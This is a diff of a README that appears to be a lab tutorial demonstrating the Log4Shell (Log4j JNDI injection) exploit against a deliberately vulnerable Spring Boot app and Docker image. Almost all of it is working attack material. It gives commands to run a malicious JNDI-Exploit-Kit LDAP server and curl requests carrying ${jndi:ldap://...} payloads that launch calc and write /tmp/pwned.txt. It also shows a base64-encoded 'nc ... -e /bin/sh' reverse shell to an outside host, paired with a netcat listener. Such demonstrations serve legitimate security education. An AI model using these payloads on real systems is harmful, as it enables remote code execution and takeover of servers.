@@ -63,53 +63,109 @@
 #### Prerequisites:
 
 - [x] *Download LDAP server*:
-  ```wget https://github.com/pimps/JNDI-Exploit-Kit/raw/master/target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar```
+  
+  ```
+  wget https://github.com/pimps/JNDI-Exploit-Kit/raw/master/target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
+  ```
+  
   ![Alt Text](download_ldap.png)
+
 - [x] *Run LDAP server*:
+  
   - Move to the jar location and run the server using below command.
-    `java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "calc.exe" -L <your private ip>:1389`
+      
+      ```
+      java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "calc.exe" -L <your private ip>:1389
+      ```
+      
   ![Alt Text](run_ldap.png)
+  
   > *_NOTE:_*  Use **hostname -I | awk '{print $1}'** to ge the private IP.
+
 - [x] *Create a spring boot application using log4j2 dependency with version less than 2.15*: 
+     
      -  Open any Java IDE (Eclipse or SpringToolSuite) \
          ![createapp](setup_1609877530_1610434665.gif)
-     -  Replace pom.xml with below file & copy below LogController src/main/java,
-          [pom](pom.xml) 
+     
+     -  Replace pom.xml with below file & copy below LogController src/main/java,<br/>
+          [pom](pom.xml) <br/>
           [LogController](LogController.java) 
+     
      - Add below lines in default file created under src/main/java --> *Application.java in main method. 
-      ```
-      System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-      System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
-      ```
+      
+        ```
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
+        ```
+     
      - Install [kali-linux](https://www.kali.org/docs/introduction/download-official-kali-linux-images/) and execute below command to install docker for executing app in docker         container.
-    `sudo apt install docker.io` 
+        
+        ```
+        sudo apt install docker.io
+        ``` 
     
 #### Live Demo:
 I will cover 3 scenarios where the malicious code will execute different outputs on the host system/server.
+
 - Open calculator on windows system by executing vulnerable java application on local system.
+  
   - Run the spring boot application from STS boot dashboard as below.  
     ![run app](02-start-single.png) 
-  - Use curl to send request to host server with malicious code.<br/>
-    	`curl <your IP>:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/Y2FsYy5leGU=}'` 
+  
+  - Use curl to send request to host server with malicious code.
+    	
+      ```
+      
+      curl <your IP>:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/Y2FsYy5leGU=}'
+      
+      ``` 
+      
     ![check calc](http://g.recordit.co/I5a0PeQpkf.gif)  
+    
 - Creating a txt file inside server after hosting application on docker container.
-  - Host the same application in docker using below commands.<br/> 
-    ```
-    docker pull vamsi13krish/vulnerable-app:latest`<br/> 
-    docker run -d --name vulnerable-app -p 8080:8080 vamsi13krish/vulnerable-app
-    curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_unix/dG91Y2ggL3RtcC9wd25lZC50eHQK}'
-    ```
-  - Check the docker container for pwned.txt file in /tmp folder using below command  <br/>
-    	```docker exec -it <container ID> ls /tmp```
-  	>*_NOTE_*: Use **docker ps** to get container ID <br/>
+    
+    - Host the same application in docker using below commands. 
+          
+         ```
+          docker pull vamsi13krish/vulnerable-app:latest
+          docker run -d --name vulnerable-app -p 8080:8080 vamsi13krish/vulnerable-app
+          curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_unix/dG91Y2ggL3RtcC9wd25lZC50eHQK}'
+         ```
+          
+    - Check the docker container for pwned.txt file in '/tmp' folder using below command 
+        
+         ```
+          docker exec -it <container ID> ls /tmp
+         ```
+        
+        >*NOTE*: Use **docker ps** to get container ID 
+
+
     ![file](http://g.recordit.co/Bn8ImBR7wn.gif)
+    
 - Getting complete access to the host server using netcat command that will be passed in malicious code on to host server using log4j vulnerability.
-  - Use below command to convert the required netcat command to base64 encoded string. <br/>  
-    	`echo "nc 172.26.9.117 9999 -e /bin/sh" | base64`
-  - Copy the base64 string and paste after exec_global/ in below command  <br/> 
-   	 `${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}`
-  - Now open other terminal and run below command to listen to the port 9999. <br/>
-    	`nc -nvlp 9999`
-  - Run below Curl command and check the listening terminal again  <br/>
-  	  `curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}'`  
-    ![Boom](http://g.recordit.co/xrvaibjQcF.gif)
+    - Use below command to convert the required netcat command to base64 encoded string. 
+       
+        ```
+        echo "nc 172.26.9.117 9999 -e /bin/sh" | base64
+        ```
+        
+     - Copy the base64 string and paste after 'exec_global/' in below command 
+       
+         ```linux
+         ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}
+         ```
+       
+     - Now open other terminal and run below command to listen to the port 9999.
+
+          ```
+          nc -nvlp 9999
+          ```
+      
+     - Run below Curl command and check the listening terminal again.
+        
+          ```
+          curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/bmMgIDE3Mi4yNi45LjExNyA5OTk5IC1lIC9iaW4vc2gK}'
+          ```  
+        
+        ![Boom](http://g.recordit.co/xrvaibjQcF.gif)
